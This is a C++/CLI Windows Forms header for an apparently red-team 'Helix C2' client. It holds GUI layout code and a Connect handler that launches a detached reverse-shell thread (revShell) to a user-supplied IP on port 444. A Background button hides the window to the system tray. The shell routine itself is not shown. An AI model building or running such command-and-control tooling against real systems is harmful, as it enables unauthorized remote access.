#pragma once

#include "functions.h"
#include "headers.h"

using namespace std;

namespace Helix {

    using namespace System;
    using namespace System::ComponentModel;
    using namespace System::Collections;
    using namespace System::Windows::Forms;
    using namespace System::Data;
    using namespace System::Drawing;
    using namespace System::Net;

    public ref class mainForm : public System::Windows::Forms::Form {

    private: // DO NOT DELETE THIS LINE !!
        // AND THIS
        // AND THIS
        // AND THIS

    public:

        mainForm(void) {
            bool createdNew = false;
            HANDLE hMutex = CreateMutex(NULL, TRUE, L"Global\\HelixMutex");

            if (GetLastError() == ERROR_ALREADY_EXISTS) {
                MessageBox::Show("An instance of this application is already running.",
                    "Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
                Environment::Exit(0);
            }
            else {
                InitializeComponent();
            }
        }

    protected:
        ~mainForm() {
            if (components) {
                delete components;
            }
        }

    private:
        // Form components
        System::Windows::Forms::TextBox^ ipAddrBox;
        System::Windows::Forms::Button^ button1;
        System::Windows::Forms::TextBox^ textBox1;
        System::Windows::Forms::GroupBox^ groupBox1;
        System::Windows::Forms::TextBox^ textBox2;
        System::Windows::Forms::Label^ label1;
        System::Windows::Forms::Label^ label2;
        System::Windows::Forms::GroupBox^ groupBox2;
        System::Windows::Forms::TextBox^ textBox3;
        System::Windows::Forms::Button^ button2;

        // Container for components
        System::ComponentModel::Container^ components;


    public:
        void updateTextBox(System::String^ text) {
            this->textBox3->Text += text + "\r\n";
        }


#pragma region Windows Form Designer generated code
        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        void InitializeComponent(void) {
            System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(mainForm::typeid));
            this->ipAddrBox = (gcnew System::Windows::Forms::TextBox());
            this->button1 = (gcnew System::Windows::Forms::Button());
            this->textBox1 = (gcnew System::Windows::Forms::TextBox());
            this->groupBox1 = (gcnew System::Windows::Forms::GroupBox());
            this->button2 = (gcnew System::Windows::Forms::Button());
            this->label2 = (gcnew System::Windows::Forms::Label());
            this->label1 = (gcnew System::Windows::Forms::Label());
            this->textBox2 = (gcnew System::Windows::Forms::TextBox());
            this->groupBox2 = (gcnew System::Windows::Forms::GroupBox());
            this->textBox3 = (gcnew System::Windows::Forms::TextBox());
            this->groupBox1->SuspendLayout();
            this->groupBox2->SuspendLayout();
            this->SuspendLayout();
            // 
            // ipAddrBox
            // 
            this->ipAddrBox->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->ipAddrBox->Location = System::Drawing::Point(15, 44);
            this->ipAddrBox->Multiline = true;
            this->ipAddrBox->Name = L"ipAddrBox";
            this->ipAddrBox->Size = System::Drawing::Size(156, 23);
            this->ipAddrBox->TabIndex = 1;
            this->ipAddrBox->TextChanged += gcnew System::EventHandler(this, &mainForm::textBox1_TextChanged);
            // 
            // button1
            // 
            this->button1->DialogResult = System::Windows::Forms::DialogResult::Cancel;
            this->button1->ForeColor = System::Drawing::Color::Black;
            this->button1->Location = System::Drawing::Point(15, 73);
            this->button1->Name = L"button1";
            this->button1->Size = System::Drawing::Size(75, 23);
            this->button1->TabIndex = 3;
            this->button1->Text = L"Connect";
            this->button1->UseVisualStyleBackColor = true;
            this->button1->Click += gcnew System::EventHandler(this, &mainForm::button1_Click);
            // 
            // textBox1
            // 
            this->textBox1->Enabled = false;
            this->textBox1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->textBox1->ForeColor = System::Drawing::SystemColors::ActiveCaptionText;
            this->textBox1->Location = System::Drawing::Point(17, 11);
            this->textBox1->Name = L"textBox1";
            this->textBox1->ReadOnly = true;
            this->textBox1->Size = System::Drawing::Size(192, 21);
            this->textBox1->TabIndex = 5;
            this->textBox1->Text = L"Helix C2 Windows GUI client";
            // 
            // groupBox1
            // 
            this->groupBox1->Controls->Add(this->button2);
            this->groupBox1->Controls->Add(this->label2);
            this->groupBox1->Controls->Add(this->label1);
            this->groupBox1->Controls->Add(this->textBox2);
            this->groupBox1->Controls->Add(this->ipAddrBox);
            this->groupBox1->Controls->Add(this->button1);
            this->groupBox1->Location = System::Drawing::Point(17, 38);
            this->groupBox1->Name = L"groupBox1";
            this->groupBox1->Size = System::Drawing::Size(252, 102);
            this->groupBox1->TabIndex = 6;
            this->groupBox1->TabStop = false;
            this->groupBox1->Text = L"Server connection";
            this->groupBox1->Enter += gcnew System::EventHandler(this, &mainForm::groupBox1_Enter);
            // 
            // button2
            // 
            this->button2->DialogResult = System::Windows::Forms::DialogResult::Cancel;
            this->button2->ForeColor = System::Drawing::Color::Black;
            this->button2->Location = System::Drawing::Point(96, 73);
            this->button2->Name = L"button2";
            this->button2->Size = System::Drawing::Size(75, 23);
            this->button2->TabIndex = 9;
            this->button2->Text = L"Background";
            this->button2->UseVisualStyleBackColor = true;
            this->button2->Click += gcnew System::EventHandler(this, &mainForm::button2_Click);
            // 
            // label2
            // 
            this->label2->AutoSize = true;
            this->label2->ForeColor = System::Drawing::Color::Black;
            this->label2->Location = System::Drawing::Point(177, 28);
            this->label2->Name = L"label2";
            this->label2->Size = System::Drawing::Size(26, 13);
            this->label2->TabIndex = 8;
            this->label2->Text = L"Port";
            this->label2->Click += gcnew System::EventHandler(this, &mainForm::label2_Click_2);
            // 
            // label1
            // 
            this->label1->AutoSize = true;
            this->label1->ForeColor = System::Drawing::Color::Black;
            this->label1->Location = System::Drawing::Point(12, 28);
            this->label1->Name = L"label1";
            this->label1->Size = System::Drawing::Size(58, 13);
            this->label1->TabIndex = 7;
            this->label1->Text = L"IP Address";
            // 
            // textBox2
            // 
            this->textBox2->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->textBox2->Location = System::Drawing::Point(180, 44);
            this->textBox2->Multiline = true;
            this->textBox2->Name = L"textBox2";
            this->textBox2->ReadOnly = true;
            this->textBox2->Size = System::Drawing::Size(54, 23);
            this->textBox2->TabIndex = 4;
            this->textBox2->Text = L"444";
            // 
            // groupBox2
            // 
            this->groupBox2->Controls->Add(this->textBox3);
            this->groupBox2->Location = System::Drawing::Point(17, 146);
            this->groupBox2->Name = L"groupBox2";
            this->groupBox2->Size = System::Drawing::Size(252, 167);
            this->groupBox2->TabIndex = 7;
            this->groupBox2->TabStop = false;
            this->groupBox2->Text = L"Connection status";
            // 
            // textBox3
            // 
            this->textBox3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->textBox3->Location = System::Drawing::Point(15, 19);
            this->textBox3->Multiline = true;
            this->textBox3->Name = L"textBox3";
            this->textBox3->ReadOnly = true;
            this->textBox3->ScrollBars = System::Windows::Forms::ScrollBars::Vertical;
            this->textBox3->Size = System::Drawing::Size(219, 132);
            this->textBox3->TabIndex = 9;
            // 
            // mainForm
            // 
            this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
            this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
            this->BackColor = System::Drawing::Color::WhiteSmoke;
            this->ClientSize = System::Drawing::Size(281, 321);
            this->ControlBox = false;
            this->Controls->Add(this->groupBox2);
            this->Controls->Add(this->groupBox1);
            this->Controls->Add(this->textBox1);
            this->ForeColor = System::Drawing::Color::Red;
            this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::Fixed3D;
            this->HelpButton = true;
            this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
            this->MaximizeBox = false;
            this->Name = L"mainForm";
            this->Text = L"Helix C2 client";
            this->Load += gcnew System::EventHandler(this, &mainForm::mainForm_Load);
            this->groupBox1->ResumeLayout(false);
            this->groupBox1->PerformLayout();
            this->groupBox2->ResumeLayout(false);
            this->groupBox2->PerformLayout();
            this->ResumeLayout(false);
            this->PerformLayout();

        }
#pragma endregion

    private:
        // Event handlers

        System::Void label1_Click(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void mainForm_Load(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void webBrowser1_DocumentCompleted(System::Object^ sender,
            System::Windows::Forms::WebBrowserDocumentCompletedEventArgs^ e) {
        }

        System::Void textBox1_TextChanged(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void label2_Click(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void label2_Click_1(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void button1_Click(System::Object^ sender, System::EventArgs^ e) {

            System::String^ ipAddrManaged = this->ipAddrBox->Text;

            IntPtr ptrToStringChars = System::Runtime::InteropServices::Marshal::StringToHGlobalAnsi(ipAddrManaged);
            char* ipAddr = static_cast<char*>(ptrToStringChars.ToPointer());

            if (strcmp(ipAddr, "") == 0) {
                MessageBox::Show("IP address is empty", "Error", MessageBoxButtons::OK, MessageBoxIcon::Error);
            }
            else {

                updateTextBox("Attempting connection...");

                thread revShellThread(revShell, ipAddr);
                revShellThread.detach();

            }

            System::Runtime::InteropServices::Marshal::FreeHGlobal(ptrToStringChars);
        }

        System::Void richTextBox1_TextChanged(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void groupBox1_Enter(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void label2_Click_2(System::Object^ sender, System::EventArgs^ e) {
        }

        System::Void button2_Click(System::Object^ sender, System::EventArgs^ e) {
            this->Hide();
            this->ShowInTaskbar = false;

            NotifyIcon^ notifyIcon = gcnew NotifyIcon();
            notifyIcon->Icon = gcnew System::Drawing::Icon("RTA_logo.ico");
            notifyIcon->Visible = true;
            notifyIcon->BalloonTipText = "App is running in the background.";
            notifyIcon->ShowBalloonTip(1000);
            notifyIcon->Click += gcnew EventHandler(this, &mainForm::ShowFormFromTray);
        }

        System::Void ShowFormFromTray(System::Object^ sender, System::EventArgs^ e) {
            this->Show();
            this->ShowInTaskbar = true;
        }

    };
}
